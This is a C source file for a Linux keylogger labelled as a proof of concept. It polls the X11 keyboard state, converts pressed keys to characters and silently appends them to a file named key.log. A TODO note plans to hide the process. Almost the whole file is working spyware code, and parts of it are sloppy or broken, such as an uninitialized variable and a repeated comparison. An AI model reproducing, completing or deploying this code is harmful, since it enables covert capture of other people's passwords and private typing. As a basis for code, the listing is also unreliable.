// ==============================================================================
// Linux Keylogger ( PoC )
//
// TODO:
// - log every existing key
// - hide process
// - improve Code ( a switch case, should be better for the second for loop )
// ==============================================================================
#include <X11/Xlib.h>
#include <X11/keysymdef.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>
#include <string.h>
// ==============================================================================

#define XK_Shift_L                       0xffe1  /* Left shift */
#define XK_Shift_R                       0xffe2  /* Right shift */
#define XK_Control_L                     0xffe3  /* Left control */
#define XK_Control_R                     0xffe4  /* Right control */
#define XK_Caps_Lock                     0xffe5  /* Caps lock */
#define XK_Shift_Lock                    0xffe6  /* Shift lock */

void log (const char * fmt, ...)
{
	va_list		va_alist;
	char		buf[256]={0},logbuf[256]={0};
	FILE*		file;
	struct tm*	current_tm;
	time_t	current_time;
	time ( &current_time );
	current_tm = localtime ( &current_time );
	//sprintf ( logbuf, "%02d:%02d:%02d-> ", current_tm->tm_hour, current_tm->tm_min, current_tm->tm_sec );
	va_start( va_alist, fmt );
	vsprintf( buf, fmt, va_alist );
	va_end( va_alist );
	strcat( logbuf, buf );
	//strcat( logbuf, "\n");
	if (strcmp(logbuf, "space") == 0) strcpy(logbuf, " ");

	if (strcmp(logbuf, "apostrophe") == 0) strcpy(logbuf, "\"");	
	if (strcmp(logbuf, "comma") == 0) strcpy(logbuf, ",");	
	if (strcmp(logbuf, "period") == 0) strcpy(logbuf, ".");	

	if( ( file = fopen( "key.log", "a+") ) != NULL )
	{
		if (strlen(logbuf) != 0) {
		  fputs( logbuf, file );
		  fclose( file );
		}
	}
}
// ==============================================================================
int main( int argc, char* argv[] )
{
    Display * display;

    char szKey[32];
    char szKeyOld[32] = {0};

    char szBit;
    char szBitOld;
    int  iCheck;

    char szKeysym;
    char * szKeyString;
    bool shift=false;
    int iKeyCode;

    Window focusWin = NULL, oldWin;
    int iReverToReturn = NULL;

    XEvent event;

    printf( "%s\n%s\n\n",
    "Linux Keylogger - Visit www.hamsterbaum.de",
    "Version: 0.1");

    display = XOpenDisplay( NULL );

    if( display == NULL )
    {
        printf( "Error: XOpenDisplay" );
        return -1;
    }

    while( true )
    {
        XQueryKeymap( display, szKey );

        if( memcmp( szKey, szKeyOld, 32 ) != NULL )
        {
            for( int i = 0; i < sizeof( szKey ); i++ )
            {
                szBit = szKey[i];
                szBitOld = szKeyOld[i];
                iCheck = 1;

                for ( int j = 0; j < 8 ; j++)
                {
                    if ( ( szBit & iCheck ) && !( szBitOld & iCheck ) )
                     {
                         iKeyCode = i * 8 + j ;

				/*
				
				keysym = XKeycodeToKeysym(dpy,xe->xkey.keycode,0)

					with

					{
					int keysyms_per_keycode_return;
					keysym = *XGetKeyboardMapping(dpy,xe->xkey.keycode,1,&keysyms_per_keycode_return);
				*/
		 	 //printf("the letter %.x", iKeyCode);
		 	 //if (shift)
			//	 szKeysym = XKeycodeToKeysym( display, iKeyCode, 0);
			// else
 	 		//	 szKeysym = XKeycodeToKeysym( display, iKeyCode, 1);

 			 if (szKeysym == (int)-31 || szKeysym == (int)-30 || szKeysym == (int)-30 || szKeysym == (int)-30) {			  			 
   	                     szKeysym = XKeycodeToKeysym( display, iKeyCode, 1);
   	                     //continue;
			 }
			 else  szKeysym = XKeycodeToKeysym( display, iKeyCode, 0);
			 
			 //if (szKeysym == NULL) continue;
			 
			 //int kpkr;
			 //szKeysym = *XGetKeyboardMapping(display, iKeyCode, 0, &kpkr);
                         //szKeyString = XKeysymToString( szKeysym );

                         //XGetInputFocus( display, &focusWin, &iReverToReturn );
   	                 
   	                 //if (focusWin != oldWin)
   	                 	printf("\n");			

   	                 //if (strcmp(szKeyString, "space") == 0)
   	                 //	strcpy(szKeyString, " ");
   	                 
//   	                 printf("%s", szKeyString);
   	                 //if (szKeysym > 0) {
	   	             printf("%i", szKeysym);
   	                     log("%c", szKeysym);
   	                 //}
   	                 
   	                 //printf( "WindowID %x Key: %s\n", focusWin, szKeyString );

                         //LogMe( "WindowID %x Key: %s\n", focusWin, szKeyString );
                     }
                    iCheck = iCheck << 1 ;
                }
            }
        }
        memcpy( szKeyOld, szKey, 32 );
    }
    XCloseDisplay( display );
    return 0;
}

